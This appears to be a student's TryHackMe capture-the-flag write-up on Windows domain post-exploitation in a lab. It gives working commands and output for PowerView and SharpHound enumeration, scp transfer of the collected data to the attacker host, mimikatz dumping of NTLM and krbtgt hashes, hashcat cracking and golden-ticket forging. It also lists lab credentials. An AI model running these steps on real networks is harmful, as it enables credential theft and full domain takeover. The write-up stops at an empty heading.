# Try Hack me's Post-Exploitation Basics Notes

Target: `Windows Server v1.1`

Target ip: `10.10.35.17`

Attacker ip: `10.6.77.38`

RDP/SSH Username: `Administrator`

RDP/SSH Password: `P@$$W0rd`

RDP/SSH Domain Name:`CONTROLLER`





## Intro
**This room will cover**

-post-exploitation enumeration with powerview and bloodhound

-dumping hashes and golden ticket attacks with mimikatz

-basic information gathering using windows server tools and logs

-maintaining access with metasploit to get a meterpreter shell






## Enumeration w/ Powerview

*Starting this room requires RDP or SSHing into the maching.* **Powerview** is a powershell script from the powershell empire that can be used for enumerating a domain after you have already gained a shell in the system. It is already installed on this target machine. Can be found localy on kali's powersploit documentation and scripts
`/usr/share/window-resources/powersploit`

### Steps

1. Start Powershell, using -ep to bypass the execution policy of powershell, allowing scripts to run:

`powershell -ep bypass`

2. Start PowerView:

`. .\Downloads\PowerView.ps1`

3. Enumerate the domain users:

`Get-NetUser | select cn`

```powershell
PS C:\Users\Administrator>Get-NetUser | select cn
cn                  
--                          
Administrator               
Guest                       
krbtgt                      
Machine-1                   
Admin2                      
Machine-2                   
SQL Service                 
POST{P0W3RV13W_FTW}         
sshd 
```

4. Enumerate the domain groups:

`Get-NetGroup -GroupName *admin*`
```powershell
PS C:\Users\Administrator>Get-NetGroup -GroupName *admin*
Administrators
Hyper-V Administrators
Storage Replica Administrators
Schema Admins
Enterprise Admins
Domain Admins
Key Admins
Enterprise Key Admins
DnsAdmins
```

5. Now enumerate the domain further on your own



Here's a cheatsheet to help you with commands: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

---

### Questions
1. What is the shared folder that is not set by default

*hint: Invoke-ShareFinder*

`Get-NetShare`

```powershell
PS C:\Users\Administrator> Get-NetShare      

shi1_netname  shi1_type shi1_remark         
------------  --------- -----------         
ADMIN$       2147483648 Remote Admin        
C$           2147483648 Default share       
IPC$         2147483651 Remote IPC          
NETLOGON              0 Logon server share  
Share                 0                     
SYSVOL                0 Logon server share 

```


*or from the hint*

`Invoke-ShareFinder`

```powershell
PS C:\Users\Administrator> Invoke-ShareFinder 
\\Domain-Controller.CONTROLLER.local\ADMIN$     - Remote Admin 
\\Domain-Controller.CONTROLLER.local\C$         - Default share 
\\Domain-Controller.CONTROLLER.local\IPC$       - Remote IPC
\\Domain-Controller.CONTROLLER.local\NETLOGON   - Logon server share
\\Domain-Controller.CONTROLLER.local\Share      -
\\Domain-Controller.CONTROLLER.local\SYSVOL     - Logon server share
```
a: Share

---

2. What operating system is running inside of the network besides Windows Server 2019 

*hint Get-NetComputer -fulldata | select operatingsystem*

```powershell
PS C:\Users\Administrator\Downloads> Get-NetComputer -fulldata | select operatingsystem

operatingsystem                  
---------------
Windows Server 2019 Standard
Windows 10 Enterprise Evaluation
Windows 10 Enterprise Evaluation
```


a: Windows 10 Enterprise Evaluation

---

3. I've hidden a flag inside the users, find it. 

*to go with the previous naming system:*

`Get-NetUser | select name`

```powershell
PS C:\Users\Administrator\Downloads> Get-NetUser | select name

name                
----
Administrator
Guest
krbtgt
Machine-1
Admin2
Machine-2
SQL Service
POST{P0W3RV13W_FTW}
sshd
```
a: POST{P0W3RV13W_FTW}

---


## Enumeration w/ Bloodhound

Bloodhound is a GUI that lets one visually map a network. Sharphound, which is similar to PowerView take the user, groups, trusts etc. of the network,  collects them into a .json file to be used inside of Bloodhound.

SharpHound is alread on the target.

### To install Bloodhound on the attacking machine:

1. `apt-get install bloodhound`

2. `sudo neo4j console`

(delault credentials: neo4j/neo4j)

### Getting loot w/ SharpHound

1. *Same as PowerView*`powershell -ep bypass`

2. `. .\Downloads\SharpHound.ps1`

3. `Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip`
```powershell
controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator\Downloads>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Downloads> . .\SharpHound.ps1
PS C:\Users\Administrator\Downloads> Invoke-Bloodhound -CollectionMethod ALL -Domain CONTROLLER.local -ZipFileName l
oot.zip
------------------------------------------------ 
Initializing SharpHound at 11:22 AM on 7/29/2021 
------------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain CONTROLLER.LOCAL using path CN=Schema,CN=Configuration,DC=CONTROLLER,DC=LOCAL    
PS C:\Users\Administrator\Downloads> [+] Cache File not Found: 0 Objects in cache 

[+] Pre-populating Domain Controller SIDS 
Status: 0 objects finished (+0) -- Using 71 MB RAM 
Status: 66 objects finished (+66 8)/s -- Using 80 MB RAM 
Enumeration finished in 00:00:00.6137046 
Compressing data to C:\Users\Administrator\Downloads\20210729112230_loot.zip
You can upload this file directly to the UI 

SharpHound Enumeration Completed at 11:22 AM on 7/29/2021! Happy Graphing! 
```
4. Transfer the loot.zip folder to the attacker machine 

*note since connecting via ssh, scp can be used to transfer the file*

```
scp -r  Administrator@10.10.35.17:C:/Users/Administrator/Downloads/20210731093702_loot.zip ~/CTF/THM/Post_Exploitation_Basics/loot.zip


Administrator@10.10.35.17's password: 
20210731093702_loot.zip             100% 9545   101.8KB/s   00:00    
                          
```

### Mapping out the Target network using Bloodhound

1. Run the command `bloodhound` on attacker maching

2. Sign in using the same credentials that had been set with Neo4j 

*had to reset my password via the neo4j interface on localhost*

3. Import the ***loot.zip*** folder into **bloodhound** by either draging and dropping or by clicking the **import** button.

*For my version I had to drag and drop, and the import feature gave an error about "corrupted JSON files"*

## Dumping hashes w/ mimikatz

**Mimikatz** is a very popular and power post-exploitation tool mainly used for dumping user credentials inside of an Active Directory network

This lab focuses on:
1. Dumping NTLM hashes with mimikatz
2. cracking those hashes using the offline hash cracking tool **hashcat**

### Dump Hashes with mimikatz
**note** *mimikatz.exe has already been placed in the target machine's Downloads folder*

1. `cd Downloads && mimikatz.exe` 
 
Will
- **c**hange **d**irectory to the downloads folder 
- and then executes mimikatz.exe

```powershell
controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator>cd Downloads && 
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 May  2 2020 16:23:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/ 

mimikatz #  
```

2. `privilege::debug` to ensure that the output is "Privilege '20' ok" meaning that mimikatz is running as an administrator

```
mimikatz # privilege::debug 
Privilege '20' OK 

mimikatz #
```

3. `lsadump::lsa /patch` to dump the hashes

```
mimikatz # lsadump::lsa /patch 
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 5508500012cc005cf7082a9a89ebdfdf

RID  : 0000044f (1103)
User : Machine1
LM   :
NTLM : 64f12cddaa88057e06a81b54e73b949b

RID  : 00000451 (1105)
User : Admin2
LM   :
NTLM : 2b576acbe6bcfda7294d6bd18041b8fe

RID  : 00000452 (1106)
User : Machine2
LM   :
NTLM : c39f2beb3d2ec06a62cb887fb391dee0

RID  : 00000453 (1107)
User : SQLService
LM   :  
NTLM : f4ab68f27303bcb4024650d8fc5f973a

RID  : 00000454 (1108)
User : POST
LM   :
NTLM : c4b0e1b10c7ce2c4723b4e2407ef81a2

RID  : 00000457 (1111)
User : sshd
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000003e8 (1000)
User : DOMAIN-CONTROLL$
LM   :
NTLM : 472c79ff822f8e57e100b97879c43aff

RID  : 00000455 (1109)
User : DESKTOP-2$
LM   :
NTLM : 3c2d4759eb9884d7a935fe71a8e0f54c

RID  : 00000456 (1110)
User : DESKTOP-1$
LM   :
NTLM : 7d33346eeb11a4f12a6c201faaa0d89a

mimikatz #
```

### Cracking Hashes with hashcat
Syntax:`hashcat -m 1000 <hash> rockyou.txt` 
- **hashcat** to run hashcat
- **-m 1000** for mode type(NTLM)
- **rockyou.txt** for the wordlist.

### Questions

1. What is **Machine1's** password?

`hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b ~/Tools/wordlists/rockyou.txt`

```
* Filename..: rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 13 secs

64f12cddaa88057e06a81b54e73b949b:Password1       
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: 64f12cddaa88057e06a81b54e73b949b
Time.Started.....: Sat Jul 31 20:47:45 2021 (0 secs)
Time.Estimated...: Sat Jul 31 20:47:45 2021 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3387.5 kH/s (0.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4096/14344384 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 2048/14344384 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: slimshady -> oooooo

Started: Sat Jul 31 20:46:47 2021
Stopped: Sat Jul 31 20:47:46 2021
```
A: `Password1`

--

2. What is the Machine2 Hash

Gotten from mimikatz output:

A: `c39f2beb3d2ec06a62cb887fb391dee0`

## Golden Ticket Attacks with mimikatz

using the same tool as the previous task, but this time to create a golden ticket 

### What is a golden ticket

Kerberos is a ticket granting service, by dumping the Kerberos ticket granting ticket user's (krbtgt) hash, and security identifier one can create a "Golden Ticket" used to access the other machines on the network.

### Dump the krbtgt Hash

1. `cd downloads && mimikatz.exe`
2.  `privilege::debug`
3.  `lsadump::lsa /inject /name:krbgt` Dumping the hash and security identifier

```
mimikatz # lsadump::lsa /inject /name:krbtgt 
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 5508500012cc005cf7082a9a89ebdfdf
    LM   :
  Hash NTLM: 5508500012cc005cf7082a9a89ebdfdf
    ntlm- 0: 5508500012cc005cf7082a9a89ebdfdf
    lm  - 0: 372f405db05d3cafd27f8e6a4a097b2c

    25  8f46d9db219cbd64fb61ba4fdb1c9ba7
    26  36b6a21f031bf361ce38d4d8ad39ee0f
    27  e69385ee50f9d3e105f50c61c53e718e
    28  ca006400aefe845da46b137b5b50f371
    29  15a607251e3a2973a843e09c008c32e3

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 64ef5d43922f3b5d

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8e544cabf340db750cef9f5db7e1a2f97e465dffbd5a2dc64246bda3c75fe53d        
      aes128_hmac       (4096) : 7eb35bddd529c0614e5ad9db4c798066
      des_cbc_md5       (4096) : 64ef5d43922f3b5d

 * NTLM-Strong-NTOWF
    Random Value : 666caaaaf30081f30211bd7fa445fec4

```
### Create a Golden Ticket

1. Syntax `kerberos::golden /user: /domain: /sid: /krbtgt: /id`

Gotten from running:
`mimikatz # lsadump::lsa /inject /name:Administrator 
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 

RID  : 000001f4 (500)
User : Administrator`

To log in as Administrator
- user: `Administrator`
- domain: `controller.local`
- sid (server identifier): `S-1-5-21-849420856-2351964222-986696166`
- krbtgt (NTLM): `5508500012cc005cf7082a9a89ebdfdf`
-id `500` 

Then crafting: `kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500`

```
mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
User      : Administrator
Domain    : controller.local (CONTROLLER)
SID       : S-1-5-21-849420856-2351964222-986696166
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt
Lifetime  : 7/31/2021 1:25:32 PM ; 7/29/2031 1:25:32 PM ; 7/29/2031 1:25:32 PM
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```
### Using the Golden Ticket to access other machines

1. `misc::cmd` Will open a new command prompt with elevated privileges to all machines
Feature was disabled on THM's lab

## Enumeration with Server Manager







